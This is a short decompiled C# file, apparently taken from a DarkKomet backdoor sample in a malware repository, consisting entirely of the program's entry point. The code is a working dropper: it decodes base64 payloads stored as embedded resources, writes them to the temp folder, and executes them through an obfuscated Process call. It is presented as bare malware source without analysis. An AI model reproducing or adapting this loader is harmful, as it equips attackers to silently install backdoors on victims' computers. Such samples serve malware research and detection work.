// Decompiled with JetBrains decompiler
// Type: mx7113
// Assembly: 5, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D96FE905-3567-4568-B7BF-8C667D038E34
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.DarkKomet.aykq-fdc0862a8406ebbcbbf4f093602f275a5f88cc2d88940d115e6108504c21b1f4.exe

using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using SmartAssembly.MemoryManagement;
using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;

[StandardModule]
internal sealed class mx7113
{
  [NonSerialized]
  internal static GetString \u0012;

  [STAThread]
  public static void Main()
  {
    MemoryManager.AttachApp();
    ResourceManager resourceManager = new ResourceManager(mx7113.\u0012(213), Assembly.GetExecutingAssembly());
    object resourceSet = (object) resourceManager.GetResourceSet(CultureInfo.CurrentCulture, true, true);
    try
    {
      foreach (object obj in (IEnumerable) resourceSet)
      {
        DictionaryEntry dictionaryEntry1;
        DictionaryEntry dictionaryEntry2 = obj != null ? (DictionaryEntry) obj : dictionaryEntry1;
        byte[] array = Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(Conversions.ToString(dictionaryEntry2.Key))));
        FileStream fileStream = new FileStream(Conversions.ToString(Operators.ConcatenateObject((object) Path.GetTempPath(), dictionaryEntry2.Key)), FileMode.Create);
        fileStream.Write(array, 0, array.Length);
        fileStream.Close();
        NewLateBinding.LateCall((object) null, typeof (Process), mx7113.\u0012(218), new object[1]
        {
          Operators.ConcatenateObject((object) Path.GetTempPath(), dictionaryEntry2.Key)
        }, (string[]) null, (Type[]) null, (bool[]) null, true);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  static mx7113() => Strings.CreateGetStringDelegate(typeof (mx7113));
}
